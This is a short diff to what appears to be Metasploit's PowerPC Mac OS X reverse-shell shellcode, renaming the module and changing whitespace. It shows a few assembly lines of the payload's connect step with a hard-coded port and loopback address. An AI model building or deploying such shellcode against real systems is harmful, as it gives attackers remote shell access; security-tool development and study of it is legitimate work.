@@ -1,6 +1,6 @@
 ;;
 ;
-;        Name: osx_reverse_shell
+;        Name: single_reverse_tcp
 ;   Qualities: Can Have Nulls
 ;   Platforms: MacOS X / PPC
 ;     Authors: H D Moore <hdm [at] metasploit.com>
@@ -30,7 +30,7 @@ _main:
     xor     r0, r0, r0
     mr      r30, r3
 
-    bl	_connect
+    bl		_connect
     .long 	0x00022211
     .long 	0x7f000001
 
